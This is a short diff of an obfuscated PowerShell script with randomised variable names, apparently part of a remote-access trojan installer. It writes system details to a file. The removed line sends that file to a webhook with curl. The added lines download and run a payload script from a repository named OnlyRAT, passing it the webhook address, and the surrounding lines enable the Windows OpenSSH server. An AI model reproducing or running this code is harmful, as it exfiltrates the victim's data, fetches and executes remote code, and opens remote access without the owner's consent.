@@ -36,7 +36,8 @@ Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
 Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
-cmd /c curl -F "payload_json={\"username\": \"test\", \"content\": \"world\"}" -F "file=@$CRYnrkaDbe" $PEBgxuJUfd
+Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "LNaAIdkdKM.cmd"
+./LNaAIdkdKM.cmd $PEBgxuJUfd
 mkdir $qsQBioVOkY
 Set-Location $qsQBioVOkY
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
